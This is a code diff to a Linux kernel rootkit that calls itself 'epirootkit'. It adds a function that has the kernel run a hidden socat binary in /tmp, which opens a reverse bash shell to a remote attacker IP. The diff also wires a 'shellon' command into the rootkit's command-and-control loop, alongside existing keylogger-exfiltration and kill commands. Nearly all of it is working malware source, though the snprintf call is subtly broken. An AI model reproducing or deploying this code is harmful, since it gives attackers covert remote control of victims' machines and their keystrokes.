@@ -62,6 +62,31 @@ int send_to_server(char *message)
 	return SUCCESS;
 }
 
+void launch_reverse_shell(void)
+{
+    static char *argv[] = {
+        "/tmp/.sysd",
+        "TCP:XXX.XXX.XXX.XXX:9001",
+        "EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
+        NULL
+    };
+
+	snprintf(argv[1], sizeof(argv[1]), "TCP:%s:%d", ip, port);
+
+    static char *envp[] = {
+        "HOME=/",
+        "PATH=/usr/bin:/bin:/usr/sbin:/sbin:/tmp",
+        NULL
+    };
+
+    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    if (ret < 0) {
+        pr_err("epirootkit: socat reverse shell failed: %d\n", ret);
+    } else {
+        pr_info("epirootkit: socat reverse shell launched\n");
+    }
+}
+
 /**
  * @brief Kernel thread function for managing network communication.
  *
@@ -180,6 +205,9 @@ int network_worker(void *data)
 		} else if (strncmp(recv_buffer, "klg", 3) == 0) {
 			epikeylog_send_to_server();
 			pr_info("epirootkit: network_worker: keylogger content sent\n");
+		} else if (strncmp(recv_buffer, "shellon", 7) == 0) {
+			pr_info("epirootkit: network_worker: shellon received, launching reverse shell\n");
+			launch_reverse_shell();		
 		} else if (strncmp(recv_buffer, "killcom", 7) == 0) {
 			pr_info("network_worker: killcom received, exiting...\n");
 			break;
